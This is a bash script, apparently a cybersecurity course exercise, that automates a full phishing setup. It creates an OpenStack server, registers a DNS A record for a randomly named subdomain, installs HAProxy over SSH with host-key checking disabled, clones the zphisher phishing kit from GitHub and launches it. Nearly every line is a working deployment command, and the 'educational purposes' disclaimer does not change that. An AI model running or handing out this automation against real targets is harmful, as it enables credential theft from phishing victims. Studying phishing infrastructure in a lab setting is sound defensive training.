#!/bin/bash

# April 2024, created by Robin Tauxe
# for CAS Cybersecurity
# everything made on this script are made for educational purposes

echo "Welcome on this automated script to perform a complete phishing attack quickly"

# Définition du nom à l'aide de la fonction RANDOM

randomstring=$(printf '%s' $(echo "$RANDOM" | md5sum) | cut -c 1-10)
defname="cas-cyber-""$randomstring"

echo -e "The finale server name will be : $defname"

# Création du serveur

echo -e "Server creation has been requested. Please wait 2 minutes"
openstack server create --image "Ubuntu 22.04 LTS Jammy Jellyfish" --flavor a2-ram4-disk20-perf1 --key-name rt-rsa --network ext-net1 $defname --wait
## !! OUVERTURE FW A PREVOIR !! ##

# Récupération de l'adresse IP

ipadd=$(openstack server show $defname -f json | jq -r '.addresses'| grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b")
sleep 15

## Création d'un record de type A sur l'IP du serveur pour le nom généré

openstack recordset create --type A --record $ipadd cloud.rt-cas-cyber.ch. $randomstring

commands=(
        "git clone --depth=1 https://github.com/htr-tech/zphisher.git"
        "sudo apt install --no-install-recommends software-properties-common -y"
        "sudo add-apt-repository ppa:vbernat/haproxy-2.4 -y"
        "sudo apt install haproxy=2.4.\* -y"
        "mkdir /home/ubuntu/haproxy"
        )

# Boucle sur la liste des commandes et exécution via
for command in "${commands[@]}"; do
        ssh ubuntu@$ipadd -o StrictHostKeyChecking=no "$command"
        sleep 1
done

echo -e "All commands have been run"

sleep 5

# Copie du fichier de configuration haproxy sur la machine distante et activation du service

scp /home/rt/openstack/haproxy.cfg ubuntu@$ipadd:/home/ubuntu/haproxy/haproxy.cfg

echo -e "Copie du fichier depuis home vers etc"
ssh ubuntu@$ipadd -o StrictHostKeyChecking=no "sudo cp /home/ubuntu/haproxy/haproxy.cfg /etc/haproxy/haproxy.cfg"
sleep 10

echo -e "Redémarrage du service"
ssh ubuntu@$ipadd -o StrictHostKeyChecking=no "sudo systemctl enable haproxy && sudo systemctl start haproxy"
sleep 10
echo -e "Config file have been transfered"

sleep 5

## Connexion à la machine et execution du phishing

ssh ubuntu@$ipadd -o StrictHostKeyChecking=no "cd /home/ubuntu/zphisher && bash zphisher.sh"
